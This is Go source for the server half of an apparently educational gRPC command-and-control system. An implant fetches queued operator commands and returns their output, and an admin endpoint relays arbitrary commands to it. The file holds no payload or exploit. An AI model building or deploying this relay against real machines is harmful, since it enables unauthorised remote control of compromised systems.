package main

import (
	__ "c2/grpcapi"
	"context"
	"errors"
)

type implantServer struct {
	work, output chan *__.Command
}
type adminServer struct {
	work, output chan *__.Command
}

func NewAdminServer(work, output chan *__.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *__.Empty) (*__.Command, error) {
	var cmd = new(__.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}

func (s *implantServer) SendOutput(ctx context.Context, result *__.Command) (*__.Empty, error) {
	s.output <- result
	return &__.Empty{}, nil
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *__.Command) (*__.Command, error) {
	var res *__.Command
	go func() {
		s.work <- cmd
	}()
	res = <-s.output
	return res, nil
}
